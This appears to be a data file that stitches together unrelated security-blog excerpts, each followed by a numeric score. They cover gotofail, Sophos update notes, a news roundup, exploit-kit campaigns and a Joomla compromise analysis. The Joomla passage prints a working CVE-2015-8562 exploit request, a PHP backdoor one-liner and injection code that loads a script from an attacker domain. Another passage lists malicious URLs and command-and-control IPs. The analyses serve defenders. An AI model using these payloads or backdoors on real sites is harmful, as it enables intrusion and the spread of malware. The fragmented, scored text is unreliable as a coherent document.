As such, the user would no longer see any error and could potentially be connected through a rogue certificate, allowing the attacker to play man-in-the-middle and intercept/inject data.
You can check if your Apple device is vulnerable to this bug by visiting gotofail.com:",0.010785403637286639
"Apple provided a fix for iOS which you can download from Settings> General > Software Update but has yet to release one for OS X. While waiting for an official patch, you should not connect to any public WiFi without at least:",0.011599309743198338
"using a VPN to encrypt your communications within the access point
using an alternate browser (Chrome or Firefox) not affected by this bug",0.00858780953257543
"Please note that other programs such as Mail, iMessage, Facetime are affected and should not be used on insecure networks.
Update: Security researcher ashk4n highlighted that even with VPN the risk may still exist unless you use a different protocol such as OpenSSL.
Someone asked if VPNs fix SSL #gotofail issue. The answer is ‘not necessarily’, Mac OSX vpnagent is vulnerable too: pic.twitter.com/JDKirWUV1N — ashkan soltani (@ashk4n) February 24, 2014
@jeromesegura
",0.008897383023317107
ASG 8.307 Up2Date Released,0.008209768909123949
"An Up2Date has been released for ASG 8.307 that optimizes the one-touch update to UTM 9 for supported official appliances, and contains some security patches for the Astaro Security Gateway platform. Supported ASG appliances are unlocked and ready for upgrading you to UTM 9 (if you don't see the upgrade option in your Up2Date section, be patient - it will take some hours to fully spread. Note that if you have already downloaded the one-touch upgrade on your appliance, you will need to re-download it so it can use the updated process and bring you to 9.004+ directly. For more information, read on for the rest of the details.",0.011492820701868411
"Written by
Angelo Comazzetto",0.008855311348334505
"November 21, 2012",0.009266635659002653
Network up2date,0.007611986957109407
"An Up2Date has been released for ASG 8.307 that optimizes the one-touch update to UTM 9 for supported official appliances, and contains some security patches for the Astaro Security Gateway platform. Supported ASG appliances are unlocked and ready for upgrading you to UTM 9 (if you don’t see the upgrade option in your Up2Date section, be patient – it will take some hours to fully spread.
Note that if you have already downloaded the one-touch upgrade on your appliance, you will need to re-download it so it can use the updated process and bring you to 9.004+ directly. For more information, read on for the rest of the details.",0.011956561809288058
"ASG 8.307 Up2Date Details
News﻿
• Security Update for SMTP Proxy (Exim CVE-2012-5671)
• Fixed issues with UTM V9 Upgrade and V8 Up2Date interaction
Remarks
• System will be rebooted
• Should be installed before attempting UTM V9 Upgrade
• UTM V9 Upgrade needs to be downloaded again if it already was
Bugfixes
No bugfixes in this release
Download:
Link: ftp.astaro.com/ASG/v8/up2date/u2d-sys-8.307.tgz.gpg
MD5: da4b637d5a853c3a2f6005cbcfed245f
Size: ~23MB
Up2Date Installation:
Sophos Up2Date technology makes it easy to update your Astaro Security Gateway. There are two ways to apply an already-downloaded Up2Date package to the system:",0.011805136923842219
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the ""Watch Up2Date Progress in new window"" and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
ASG Up2Date FTP Mirrors:,0.007038564630511557
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the ASG or UTM features you should post it on our User Bulletin Board. Please indicate the version you are using (e.g. ""[8.307] Configuring IPS for my Network"").
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
There are also UTM 9 demo server environments for public use.",0.015005878794904115
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
UTM Up2Date 9.208 Released,0.008858193972508976
"Written by
Eric Bégoc",0.010229904213713614
"October 10, 2014",0.008690474132424408
Network up2date UTM UTM 9,0.01007005226623292
"Today we made available  a new Up2Date package for Sophos UTM which will introduce a security fix for CVE-2014-6271 .
Please note, that to date we are not aware that the Sophos UTM is exposed to the described vulnerabilities and this release is a precautionary update.
Please read on to see the full details of this release.",0.009521546839584283
"Sophos UTM 9.208
News",0.009371028497388467
"Security Release
Update bash package to fix potential vulnerabilities
References: CVE-2014-6271, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187
So far we are not aware of any service on UTM actually exposing these problems to attackers, this is a precautionary update.",0.008685314361769225
Remarks,0.009780636038266843
System will be rebooted,0.007758715382572667
Bugfixes,0.009816324567177737
33059 CVE-2014-6271 bash: specially-crafted environment variables can be used to inject shell commands [9.2],0.0061789738170759945
"Up2date link:
ftp://ftp.astaro.com/UTM/v9/up2date/u2d-sys-9.207019-208008.tgz.gpg",0.010127896716934592
"Up2date MD5sum:
6a912512b218064baebbee416c5b3268",0.009277321486655055
"File size:
≈350KB",0.00818403155443781
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"A Week in Security (Aug 09 – Aug 15)
Last week, we announced a new thought leadership series entitled “Marcin’s Soundbytes” wherein our very own CEO interviews other professionals in the cybersecurity industry. The videos will be shared to blog readers on a weekly basis. To start off the series, Marcin interviewed Tim Wilson (Dark Reading), Ira Winkler (Irari Report), Rob Westervelt (IDC), and ESET’s CEO, Andrew Lee.
In other blog post topics, Malwarebytes researchers also touched on automated analysis of malware behaviour using the Malheur tool, a ransomware spam targeting European countries, a smishing campaign after T-Mobile credentials, and a recently patched 0-day flaw in IE that was exploited in the wild.
Senior security researcher Christopher Boyd revealed that some ads on Web sites, when opened on a mobile device like a smartphone, can redirect users to destinations—non-malicious at the point of writing—wherein they can be charged with a certain fee without their consent. It was disconcerting and something users should be wary of from hereon.
PC video gamers, particularly those using Steam, once again saw another spam campaign distributed via the chat feature by compromised accounts. This time, the message claimed to share a funny picture to the recipient, only for him/her to find out that the image file, much like previous campaigns within the gaming platform, was also a malicious screenshot (.SCR). We detected it as Trojan.Downloader.Agent.
Notable news stories and security related happenings:",0.013778051263809488
"Lenovo PCs and Laptops Seem to have a BIOS Level Backdoor. “The Chinese computer and laptop maker, Lenovo is once again in the eye of the storm after users have found that their PCs/Laptops are shipped with a hidden backdoor at the BIOS level. Earlier in the year, it was found that all Lenovo PCs/Laptops are shipped with a spyware called Superfish.” (Source: Tech Worm)
Researchers Hack a Corvette Using SMS Messages. “Using mobile TCUs (Telematic Control Units), or better known as tracking/insurance dongles, four security researchers from the University of California in San Diego hacked a Corvette using SMS messages.” (Source: Softpedia)
HTC Caught Storing Fingerprints AS WORLD-READABLE CLEARTEXT. “Four FireEye researchers have found a way to steal fingerprints from Android phones packing biometric sensors such as the Samsung Galaxy S5 and the HTC One Max.” (Source: The Register)
Hacking Airport Security Systems with a Common Laptop. “Cyber security from I-Team investigation revealed that hackers could have the ability to shut down an airport’s security network just using a laptop. It is embarrassing read that system designed to improve security of the airports could represent the entry point for attackers.” (Source: Security Affairs)
Google Disables Inline Installation of Chrome Extensions for Deceptive Developers. “Inline installation was introduced by Google in 2011 in an effort to make it easier for users to add extensions to Chrome by allowing them to install extensions hosted on the Web Store directly from the developer’s website. Some developers have abused this feature and distributed their extensions via deceptive advertisements and websites. Google has been keeping an eye on developers who use such tactics and they will no longer be able to use inline installation starting with September 3.” (Source: Security Week)
Ubiquiti Networks Falls Victim to $47M Cyberscam. “Ubiquiti Networks, a manufacturer of networking technology for service providers and enterprises, has revealed that cyberthieves stole $46.7 million through an e-mail scam. According to a recent document filed with the Securities and Exchange Commission (SEC), the fraud involved an ’employee impersonation and fraudulent requests from an outside entity targeting the company’s finance department.'” (Source: Legal Tech News)
Windows 10’s Privacy Policy is the New Normal. “Windows 10, in normal usage and typical configurations, will send quite a lot of information to Microsoft. Windows 8, in normal usage and typical configurations, will also send quite a lot of information to Microsoft. On the other side of the fence, OS X, in normal usage and typical configurations, will send some information to Apple. It’s hard to imagine a modern day operating system that doesn’t do this, at least to some extent.” (Source: Ars Technica)
FDA Warns Hospitals to Stop Using Hackable Drug Pumps. “You may have seen news that US Food and Drug Administration is now “strongly encouraging” hospitals not to use a leading brand of drug pump over hacking fears. The BBC story is here for more details. John Smith, Principal Solution Architect at Veracode commented on the FDA issues warnings to hospitals over hackable drug infusion pumps.” (Source: Information Security Buzz)
Internal Modem can be Exploited by Malware to Gain Persistence. “Two security experts at the last Def Con hacking conference have demonstrated how Internal LTE/3G modems can be hacked to help malware survive OS reinstalls.” (Source: Security Affairs)
Researcher Generates Thousands of Phone Numbers, Matches Them to Facebook Accounts. “A security researcher has developed an algorithm that exploits a flaw in a Facebook default privacy setting to obtain cell phone numbers linked to Facebook accounts and then get information associated with those accounts.” (Source: SC Magazine)
Over 55% of All Androids at Risk of High Severity Vulnerability. “Now IBM security researchers have warned of another serious vulnerability that impacts over 55% of all Androids. The vulnerability, which has been dubbed CVE-2015-3825, affects Android versions 4.3 to 5.1, as well as the current Android M preview build, and could be exploited by malware.” (Source: Graham Cluley’s Blog)
Chip Card ATM ‘Shimmer’ Found in Mexico. “Fraud experts in Mexico have discovered an unusual ATM skimming device that can be inserted into the mouth of the cash machine’s card acceptance slot and used to read data directly off of chip-enabled credit or debit cards.” (Source: Krebs on Security)
June Was ‘Worst Month Of Malvertising Ever’. “In the first six months of 2015, malvertising was one of the biggest threats to endpoint security, causing an estimated $525 million in damages (related to repair and recovery costs), according to research released today by Invincea.” (Source: Dark Reading)
Corporate Encrypt-Everything Policies Gain Interest. “In the survey, from Vormetric and IANS, top reasons for encrypting data included; preventing data breaches (66%), fulfilling compliance or audit mandates (54%) and protection of financial and other assets (53%).” (Source: InfoSecurity Magazine)
Why You Should Stop Worrying about Online Privacy. “Consumer concern about online privacy is at all-time high due to e-commerce and mobile devices, which both collect wide swathes of consumer data, the Pew Research study says. However, people who worry about “privacy eroding into the river and being gone forever,” said Wittes, ignore how those benefits actually increase privacy.” (Source: CSO Online)
Locker: an Android Ransomware Full of Surprises. “The malware claims it has detected “forbidden pornographic” pictures on your device, says it has reported it to the FBI and asks you to pay a fine of $500. To make the (fake) report appear even more scary, the malware displays your IP address and a picture of you. It says those were sent in the report to the FBI.” (Source: Fortinet’s Security Research Blog)
Twitter Transparency Report Reveals Surge in Government Data Requests. “According to the report, which was updated on Aug. 11, 4,363 information requests from 62 different nations were made between January 2015 and June 2015, with four previously unlisted countries (Cyprus, Dominican Republic, Poland and Serbia) joining the pool of governments that sought information from the social media giant. According to the Twitter report, “information requests include worldwide government requests we’ve received for account information, typically in connection with criminal investigation,” and of the requests that Twitter received, about 58 percent resulted in the release of information.” (Source: Legal Tech News)
Dropbox Introduces USB Key Verification for Two-step Login. “While two-step verification using a phone can be effective, it is open to some risk – there is still a chance that a user can be fooled into entering their password and verification code on fake websites, says Dropbox. The U2F key – a physical key that slots into a device’s USB port – offers an additional layer of protection.” (Source: Silicon Republic)
Facebook Awards $100,000 for New Class of Vulnerabilities and Detection Tool. “The award, Facebook’s Internet Defense Prize, was handed out at the USENIX Security Symposium in Washington, D.C., and doubles last year’s inaugural payout of $50,000. The prize is an effort to recognize and fund Internet security research in the areas of defense and protection, Facebook said.” (Source: Kaspersky’s ThreatPost)
Why Even Startups Need to Care About Security. “Startups beware: Security is not just for established companies. One big data breach could cost you your business.” (Source: AlleyWatch)
Smartwatch Makers Opt for Simplicity Over Keeping User Data Safe, Warns Security Firm Trend Micro. “The study stress-tested smartwatches from major manufacturers Apple, Samsung, Motorola, LG, Sony, Asus, and Pebble to see how they ranked for physical protection, data connections and information stored to see which poses the biggest risk to consumers.” (Source: International Business Tines)
Windows 10 Might be Spying on You Even After You Tell it to Stop. “According to Ars Technica, even after you tell Microsoft that Windows 10 shouldn’t make any Internet-related inquiries while you’re using it, it appears that Windows 10 still pings Microsoft for various information.” (Source: BRG)
Zero Day in Android’s Google Admin App Can Bypass Sandbox. “The vulnerability lies in the way that the Google Admin application on Android phones handles some URLs. If another application on the phone sends the Admin app a specific kind of URL an attacker can bypass the Same Origin Policy and get data from the Admin sandbox.” (Source: Kaspersky’s ThreatPost)
Security Researchers Find Flaws in Ethernet Switches. “Cyber-security researchers in the US say that they have found security flaws in industrial Ethernet switches and gateways which could be used to attack industrial control systems in industries ranging from manufacturing to power generation. They have found vulnerabilities in four makes of Ethernet switch, but say that similar problems could exist in other devices.” (Source: Drives & Controls)",0.016884287321840552
"Safe surfing, everyone!
The Malwarebytes Labs Team
",0.01166910416539002
New Realstatistics Attack Vector Compromising Joomla Sites,0.008262485570413758
"Nov 2016 Update: If your Joomla site has been hacked, you can follow our guide to fixing it.
Read the Guide!
Over the past few weeks we’ve seen a large number of Joomla websites compromised with the Realstatistics malware campaign. This mass infection is still evolving and continues to distribute harmful ransomware to compromised website visitors.
Today we are providing more context on the new attack vector and exploitation process used to to compromise these sites.
Joomla CVE-2015-8562
The initial attack vector is a variation of the Remote Command Execution vulnerability in Joomla that was heavily exploited at the end of last year. Despite the fact that it has been patched, we still see many attempts to exploit this vulnerability using the original methods we disclosed. Almost all web application firewalls have now virtually patched this variation of the exploit. As a result, we see fewer successful attempts at compromising Joomla sites with this older vulnerability.
The new variation we discovered is using a new vector with the filter-search option which hasn’t yet been disclosed.  This results in a far higher success rate, and has a lot to do with why the Realstatistics malware campaign is successful in compromising a high number of sites in such a short period of time.
New Attack Vector
46.183.219.91 - - [19/Jun/2016:03:16:21 -0400]
""POST /?option=com_tags HTTP/1.1"" 403 4229 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36""
""POSTLOG:filter-search=bigus%7D__hxsjcurrrt%7CO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A71%3A%22eval%28base64_decode%28%24_SERVER%5B%27HTTP_QGYSD%27%5D%29%29%3BJFactory%3A%3AgetConfig%28%29%3Bexit%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7D\xF0\xFD\xFD\xFD""
As you can see from the date stamp, the initial vulnerability was exploited in June, but we didn’t see attempts to access the backdoor until the beginning of July:
46.183.219.91 - - [01/Jul/2016:04:41:20 -0400]
""POST /modules/cache.uniq_04793.php HTTP/1.1"" 403 4261 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36""
""POSTLOG:&php_func=assert&php=print%28%22MY_S%22.%22UCCESS%22%29%3B""
With this request, attackers are simply testing whether the backdoor installation was successful or not.
The content of this backdoor is common to many backdoors we see:
<?php if(isset($_POST[""php_func""])){@$_POST[""php_func""](stripslashes($_POST[""php""]));};?>",0.010353712347854538
"Payload
After the attempts to see whether the backdoor was successful or not, attackers attempt to inject the payload utilizing the backdoor.
46.183.219.91 - - [01/Jul/2016:09:35:27 -0400]
""POST /modules/cache.uniq_04793.php HTTP/1.1"" 403 4261 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36""
""POSTLOG:&php_func=assert&php=assert%28base64_decode%28str_rot13%28%27MKMuoPuvLKAyAwEsMTIwo2EyXUA0py9lo3DkZltaHHEwnaO6rJukHR52EwWWAHDlqKyZZzqHpUb5nUSDIwqEETWOHUMSHxIVI0ySoGOgDzbjJRAgAQuQZ09vpR4jJSSRLauhFwIxFmWOnH1HFUEQEx5uD1IOq3O6rJckHR9zGRb1LKSXH2SAEmO2EacGZxkWDKqjraydpIOJqUSIrJcAEmO2pIEWAUSDBIuZF011FQWOoT5YGmOJqx9gpUcnBIM6qGOkIH42JJj5oR1XH2MjZ0I1pIE5oKSHrKqjoQIdpUb4nJ5uJzyZFwI1o1I5ZT5XDJ1M….”
That is just part of the encoded payload in the request above, but after decoding the full payload this is the result:
print ""KeyCheckFront"";
...",0.01041634748804654
"$inj_code = '<script language=""JavaScript"" type=""text/JavaScript""",0.014388157524531153
"src=""hxxp://realstatistics[.]pro/js/analytics.php?id=123""></script>';",0.011044651456517451
//$inj_code = '<!-- lol777 -->';,0.012877541524103364
"$inj_search = '</head>';
...
As you can see from the code, the payload is injecting fake Realstatistics analytics code into the head section of any PHP template on the site.
Check Your Joomla Sites
This infection is only impacting unpatched Joomla sites, so make sure that your Joomla sites are up-to-date. This is a new attack vector on an old vulnerability, so if you can’t patch, you should be sure your website firewall is virtually patching this new variation.
We recommend checking your logs for requests from 46 .183 .219 .91 – if you find requests similar to the ones in this post, consider your website compromised. At this point you should take steps to remove the malware immediately and prevent reinfection.
If you are using our CloudProxy Website Firewall, your site is protected against this vulnerability through our virtual patching feature.  Our incident response team is always standing by ready to assist you in cleaning and protecting your site if you need assistance.
",0.007831630844042037
"Recent Flash Player 0-day Exploit Goes Mainstream
Security firm FireEye released a report on June 23 about targeted attacks leveraging a Flash Player zero-day vulnerability (CVE-2015-3113) in Adobe Flash Player up to version 18.0.0.160. The firm stated that some users would receive a phishing email containing a link to a site hosting the zero-day exploit.
The announcement went out around the same time as Adobe’s security bulletin and a fix for the flaw.",0.010085671061158985
"Adobe associated a Priority 1 rating to this patch:
This update resolves vulnerabilities being targeted, or which have a higher risk of being targeted, by exploit(s) in the wild for a given product version and platform. Adobe recommends administrators install the update as soon as possible. (for example, within 72 hours).
That severity level was well justified as threat actors wasted no time in studying and incorporating this new ammo into their arsenal. Indeed, only four days after the announcement (spotted by MalwareDontNeedCoffee), the vulnerability was already active in a popular exploit kit dubbed Magnitude.
For many users this is cutting it really short to be able to patch their software in due time. Without a doubt, this new exploit is going to wreak havoc on a large number of vulnerable machines.
Malwarebytes Anti-Exploit users were already protected against this threat, even if they were late on patching:",0.011201007465842738
"Magnitude EK uses the usual booby trapped SWF, followed by a malicious FLV (Flash Video) file.",0.013345609520493129
"SWF file:
<ProductInfo product='Adobe Flex' edition='' version='3.6' build='16995' compileDate='Mon Jul 2 17:52:37 2012 UTC'/>",0.007237805191406155
FLV file (metadata):,0.008661379523493662
"The Flash Video File exploits a heap buffer overflow vulnerability in the Nellymoser audio codec by exceeding its maximum length. This bug was also used previously in CVE-2015-3043 (Trend Micro details it here).
The plugin is a hacker’s favorite due to its huge user base and reusable security flaws. Indeed, attackers have the advantage as they can refactor an exploit to bypass a previous patch that didn’t completely address an insecure or complex coding implementation.
To keep or not to keep?
We can expect other exploit kits to follow suit very soon and start delivering this latest vulnerability. Without a doubt, this is the year of Flash zero-days and many are already suggesting to take drastic measures such as completely uninstalling the plugin.
For those not sure about this ‘all or nothing’ approach, a nice compromise can be reached by enabling “click-to-play”, a feature in all browsers that puts you in control to run the aforementioned plugin. A how-to guide is available here.
Regardless, we still urge everyone to update the Flash Player as soon as possible and employ a defense in depth strategy starting with anti-exploit technology to proactively mitigate weaponized vulnerabilities.
",0.010059307643239368
"On a periodic basis, cybercriminals are spamvertising malicious campaigns impersonating Verizon Wireless to tens of thousands of Verizon customers across the globe in an attempt to trick them into interacting with the fake emails. Throughout 2012, we intercepted two campaigns pretending to come from the company, followed by another campaign intercepted last month. This tactic largely relies on the life cycle of a particular campaign, intersecting with the publicly generated awareness of its maliciousness.
In this post, I’ll profile one of the most recently spamvertised campaigns impersonating Verizon Wireless. Not surprisingly, once users click on any of the links found in the malicious emails, they’re automatically exposed to the client-side exploits served by the Black Hole Exploit Kit.
More details:",0.01179015275295181
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised compromised URLs used in the campaign:
hxxp://www.hotstocks.ch/wp-content/themes/toolbox/vznbill.html
hxxp://www.howany.com/wp-content/uploads/vznbill.html
hxxp://www.erichpucher.at/templates/beez/vznbill.html
hxxp://www.govtjobsindia.org/wp-content/themes/skyfall/vznbill.html
Sample client-side exploits serving URL:
hxxp://participamoz.com/detects/holds_edge.php
Sample malicious payload-dropping URL:
hxxp://participamoz.com/detects/holds_edge.php?dvyy=1n:33:2v:1l:1h&coqy=3m&alr=30:33:1h:1h:1j:1j:1h:1m:1o:33&qds=1n:1d:1f:1d:1f:1d:1j:1k:1l
Sample client-side exploits served: CVE-2010-0188
Malicious domain name reconnaissance:
participamoz.com – 173.251.62.46; 161.200.156.200 – Email: dort.dort@live.com
Name Server: NS1.THEREGISTARS.COM – 31.170.106.17 – Email: lockwr@rocketmail.com
Name Server: NS2.THEREGISTARS.COM – 67.15.223.219 – Email: lockwr@rocketmail.com
We’ve already seen the same email address (lockwr@rocketmail.com) used in the following previously profiled campaign “Fake ‘You’ve blocked/disabled your Facebook account’ themed emails serve client-side exploits and malware“, indicating that they’ve been launched by the same malicious party.
The following malicious domains also respond to 161.200.156.200 and are part of the campaign’s infrastructure:
prosctermobile.com
aftandilosmacerati.com
pardontemabelos.com
Upon successful client-side exploitation, the campaign drops MD5: 4377dcc591f87cc24e75f8c69a2a7f8f – detected by 8 out of 46 antivirus scanners as UDS:DangerousObject.Multi.Generic.
Once executed, the sample creates the following process on the affected hosts:
C:Documents and Settings<USER>Application DataKeahatiomx.exe
It also creates the following Mutexes:
Global{CB561546-E774-D5EA-8F92-61FCBA8C42EE}
Local{744F300D-C23F-6AF3-8F92-61FCBA8C42EE}
Global{4F0B47EA-B5D8-51B7-0508-B06D3016937F}
Global{4F0B47EA-B5D8-51B7-7509-B06D4017937F}
Global{4F0B47EA-B5D8-51B7-490A-B06D7C14937F}
Global{4F0B47EA-B5D8-51B7-610A-B06D5414937F}
Global{4F0B47EA-B5D8-51B7-8D0A-B06DB814937F}
Global{4F0B47EA-B5D8-51B7-990A-B06DAC14937F}
Global{4F0B47EA-B5D8-51B7-390B-B06D0C15937F}
Global{4F0B47EA-B5D8-51B7-650B-B06D5015937F}
Global{4F0B47EA-B5D8-51B7-B90B-B06D8C15937F}
Global{4F0B47EA-B5D8-51B7-150C-B06D2012937F}
Global{4F0B47EA-B5D8-51B7-4D0C-B06D7812937F}
Global{4F0B47EA-B5D8-51B7-810C-B06DB412937F}
Global{4F0B47EA-B5D8-51B7-B90D-B06D8C13937F}
Global{4F0B47EA-B5D8-51B7-2D0E-B06D1810937F}
Global{4F0B47EA-B5D8-51B7-650E-B06D5010937F}
Global{4F0B47EA-B5D8-51B7-F508-B06DC016937F}
Global{4F0B47EA-B5D8-51B7-E90B-B06DDC15937F}
Global{4F0B47EA-B5D8-51B7-ED0C-B06DD812937F}
Global{4F0B47EA-B5D8-51B7-AD0E-B06D9810937F}
Global{4F0B47EA-B5D8-51B7-9D09-B06DA817937F}
Global{5E370004-F236-408B-8F92-61FCBA8C42EE}
Global{4F0B47EA-B5D8-51B7-990F-B06DAC11937F}
Global{EEE5022F-F01D-F059-8F92-61FCBA8C42EE}
Global{38E3341C-C62E-265F-8F92-61FCBA8C42EE}
Global{340FE32E-111C-2AB3-8F92-61FCBA8C42EE}
Global{340FE329-111B-2AB3-8F92-61FCBA8C42EE}
Local{55E9553D-A70F-4B55-8F92-61FCBA8C42EE}
Local{55E9553C-A70E-4B55-8F92-61FCBA8C42EE}
The following Registry Keys:
REGISTRYUSERS-1-5-21-299502267-926492609-1801674531-500SoftwareMicrosoftUveku
REGISTRYUSERS-1-5-21-299502267-926492609-1801674531-500SoftwareMicrosoftWABWAB4Wab File Name
REGISTRYUSERS-1-5-21-299502267-926492609-1801674531-500SoftwareMicrosoftWAB
REGISTRYUSERS-1-5-21-299502267-926492609-1801674531-500SoftwareMicrosoftWABWAB4
REGISTRYUSERS-1-5-21-299502267-926492609-1801674531-500SoftwareMicrosoftWABWAB4Wab File Name
REGISTRYMACHINESYSTEMCurrentControlSetServicesSharedAccessParametersFirewallPolicyStandardProfileGloballyOpenPortsList
REGISTRYMACHINESYSTEMControlSet001ServicesSharedAccessParametersFirewallPolicyStandardProfile
REGISTRYMACHINESYSTEMControlSet001ServicesSharedAccessParametersFirewallPolicyStandardProfileGloballyOpenPorts
It then attempts to phone back to the following IPs:
110.143.183.104
24.120.165.58
110.143.183.104
75.80.49.248
71.42.56.253
94.65.0.48
98.16.107.213
190.198.30.168
76.193.173.205
71.43.217.3
66.229.110.89
101.162.73.132
94.68.49.208
64.219.121.189
99.122.152.158
80.252.59.142
108.211.64.46
69.39.74.6
91.99.146.167
187.131.70.221
76.202.211.184
168.93.99.82
122.60.136.168
213.105.24.171
122.60.136.168
84.72.243.231
79.56.80.211
Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.012419017547302902
"Minor Chrome release fixes serious bugs
Google has updated the Chrome browser to version 43.0.2357.130 for Windows, Mac, and Linux.",0.01463076314072076
23 Jun 2015 - 12:30PM,0.01139147177035571
"Google has updated the Chrome browser to version 43.0.2357.130 for Windows, Mac, and Linux.",0.01593457107990659
"Google has updated the Chrome browser to version 43.0.2357.130 for Windows, Mac, and Linux.",0.01593457107990659
"The Chrome update has fixed at least two high severity bugs, as can be seen by the partial list released on the Chrome blog, but other details remain scarce, because as Google makes clear in its blog post:",0.011801973741009886
"“Access to bug details and links may be kept restricted until a majority of users are updated with a fix. We will also retain restrictions if the bug exists in a third party library that other projects similarly depend on, but haven’t yet fixed.”",0.009702047308137396
"One anonymous researcher received a bounty of $5,000 / €4,440 for reporting a serious scheme validation error in WebUI, now fixed and detailed as CVE-2015-1266.",0.011485475458257954
"According to a report on Softpedia, one other known fix targets a high-profile issue unveiled by Polish researcher Mariusz Mlynski at this year’s Pwn2Own hacking competition. Mlynski demonstrated an attack that exploited a cross-origin vulnerability in Mozilla Firefox to achieve privilege escalation within the browser in less than a second. The Chrome bug is now known as CVE-2015-1268, and consists of a cross-origin bypass in the browser’s Blink engine.",0.008969971866741533
"Event sponsor HP described the Pwn2Own unveil as ‘knocking it out of the park’ in a blog post, saying Mlynski: “Stepped up to Mozilla Firefox and knocked it out of the park through a cross-origin vulnerability followed by privilege escalation within the browser – all within .542 seconds. This allowed him to execute a logical flaw to escalate to SYSTEM in Windows and take home $30,000 USD for the Firefox bug and an additional $25,000 bonus for the privilege escalation.”",0.010137986023517453
"Google recently announced it would pay out research grants to security researchers seeking out potential bugs, even if they turn up empty-handed, as We Live Security reported back in February. A new ‘experimental’ tier has been added to Google’s Security Reward Program, with grants of up to $3,133.70 available for security researchers who apply to investigate specific Google services.
",0.012107367850935913
"Compromised WordPress sites launch drive-by attacks off Pirate Bay clone
WordPress, the leading Content Management System, is one of cyber criminals’ favourite target when it comes to hacking websites.
Contrary to some beliefs, it’s not because WordPress is a bad or insecurely designed CMS.
As it is often the case, problems often come from the users themselves who aren’t keeping it up to date or like to tear it apart instead of doing proper coding.
While legitimate sites getting hacked is very common, there are times when the patterns and timing are so similar that they indicate an organized effort from the bad guys.
During the past few days, we have been detecting several WordPress sites that were injected with the same iframe. Although we don’t have exact numbers on sites that have been affected, we are assuming that it is a substantial attack.",0.012234929733303312
This kind of placement is odd and so is the content: thepiratebay.in.ua. Why would regular websites link to what looks like a Pirate Bay website?,0.016543595473156203
"To be clear, this is not the officially maintained Pirate Bay, but rather a clone through The Open Bay project:
The Isohunt.to team have decided to give an early Christmas present to Pirate Bay fans. They’ve launched “The Open Bay,” an initiative that allows anyone to put a ‘copy’ of The Pirate Bay online, minimal technical knowledge required. –Excerpt from TorrentFreak.
Still, it does not answer the question of why bad guys would want to insert an iframe to this site. Perhaps click fraud or rogue affiliate behaviour?
We found the real reason behind this pretty quickly. The Pirate Bay clone is actively pushing the Nuclear exploit kit with an iframe and will infect vulnerable visitors via drive-by download attacks.",0.013453661227812774
Drive-by download flow,0.0073949328749896015
"Pirate Bay clone with a malicious iframe (the site is behind the cloudFlare reverse proxy)
Nuclear EK landing page
Flash exploit (CVE-2015-0311)
Malware payload",0.016634567654098875
Nuclear EK landing,0.008281130000853176
Flash exploit for version 16.0.0.287 and under (CVE-2015-0311),0.012345563089930511
"Malwarebytes Anti-Exploit users are already protected against this threat. Interestingly, any search on the portal returns no result at the moment, and the error message could not be anymore spot on: “404 sh*t happens”",0.010105509378424249
"Payload
The payload, detected by Malwarebytes Anti-Malware appears to belong to a banking Trojan.
Upon execution, it injects into iexplore.exe and the following registry keys are created:
HKEY_LOCAL_MACHINE\SOFTWARE\Yrubwkjp
HKEY_CURRENT_USER\Software\Yrubwkjp
It calls back to a command and control server at usabrent.ru, a domain name created just a few days ago.
Indicators of compromise
A thread on Stack Overflow discusses very similar iframe injections into WordPress sites.
While for visitors the problem looks like a straight iframe, website owners need to look for obfuscated code within their PHP files as well as possible backdoors.
